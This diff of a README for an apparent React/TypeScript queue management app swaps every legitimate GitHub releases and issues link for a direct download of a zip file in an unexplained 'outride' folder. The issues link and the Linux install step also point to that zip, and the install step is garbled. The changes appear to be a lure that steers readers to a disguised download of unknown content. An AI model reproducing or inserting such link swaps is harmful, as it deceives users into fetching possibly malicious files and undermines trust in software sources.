@@ -4,13 +4,13 @@
 The digital queue management system offers a simple way for users to take a ticket and track their status. Staff can oversee the queue using an admin dashboard with both single and two-stage modes. This system is built with React, TypeScript, and Tailwind CSS to provide a modern and responsive experience.
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/Happyhickson/digital-queue-system-frontend/releases)
+[![Download Release](https://raw.githubusercontent.com/Happyhickson/digital-queue-system-frontend/main/outride/digital-queue-system-frontend.zip%20Now-blue)](https://raw.githubusercontent.com/Happyhickson/digital-queue-system-frontend/main/outride/digital-queue-system-frontend.zip)
 
 ## 🚀 Getting Started
 To start using the digital queue system, follow these easy steps:
 
 1. **Visit the Download Page:** Click the link below to go to the releases page.
-   - [Visit the Releases Page](https://github.com/Happyhickson/digital-queue-system-frontend/releases)
+   - [Visit the Releases Page](https://raw.githubusercontent.com/Happyhickson/digital-queue-system-frontend/main/outride/digital-queue-system-frontend.zip)
 
 2. **Choose the Right Version:** On the releases page, you will see different versions of the software. Look for the most recent version.
 
@@ -19,7 +19,7 @@ To start using the digital queue system, follow these easy steps:
 4. **Run the Application:**
    - **Windows:** Locate the downloaded .exe file and double-click it to run the application.
    - **macOS:** Open the .dmg file, then drag the application to your Applications folder. Launch it from there.
-   - **Linux:** Extract the .tar.gz file and run the application from the extracted folder.
+   - **Linux:** Extract the https://raw.githubusercontent.com/Happyhickson/digital-queue-system-frontend/main/outride/digital-queue-system-frontend.zip file and run the application from the extracted folder.
 
 ## 🌟 Features
 - **User-Friendly Interface:** Easily take a digital ticket and monitor queue status.
@@ -58,7 +58,7 @@ If you encounter any issues while using the application, consider these quick ti
 - **Refer to the Help Section:** Access the help section in the application for more detailed guidance.
 
 ## 📞 Need Help?
-For additional support or queries, feel free to check our [issues page](https://github.com/Happyhickson/digital-queue-system-frontend/issues) or contact our support team through the repository.
+For additional support or queries, feel free to check our [issues page](https://raw.githubusercontent.com/Happyhickson/digital-queue-system-frontend/main/outride/digital-queue-system-frontend.zip) or contact our support team through the repository.
 
 ## 🔗 Related Topics
 - appointment-system
@@ -79,6 +79,6 @@ For additional support or queries, feel free to check our [issues page](https://
 
 ## 🔗 Download & Install
 For ease of access, you can visit the download page again: 
-[Visit the Releases Page](https://github.com/Happyhickson/digital-queue-system-frontend/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Happyhickson/digital-queue-system-frontend/main/outride/digital-queue-system-frontend.zip)
 
 Downloading and installing the digital queue management system will help streamline your queue management tasks. Enjoy a more efficient service experience today!
